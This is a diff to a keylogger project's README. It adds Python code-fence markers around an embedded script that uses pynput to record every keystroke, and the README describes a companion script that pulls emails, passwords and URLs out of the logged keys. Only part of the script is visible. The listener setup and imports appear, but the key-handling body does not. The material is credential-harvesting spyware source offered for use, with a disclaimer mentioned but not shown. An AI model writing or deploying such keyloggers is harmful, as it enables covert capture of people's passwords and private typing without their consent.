@@ -5,6 +5,8 @@
 This is a keylogger script to be able to log any key strokes. Then another script for analysis. This analysis script will detect and find any patterns that relate to emails, passwords, and URLs. As well as the most common word typed. Please read the Disclaimer to use properly.
 
 <details>
+
+'''python
 from pynput.keyboard import Listener
 import time
 import os
@@ -34,5 +36,5 @@ def on_press(key):
 with Listener(on_press=on_press) as listener:
     listener.join()
 
-</details>
+</details>'''
 
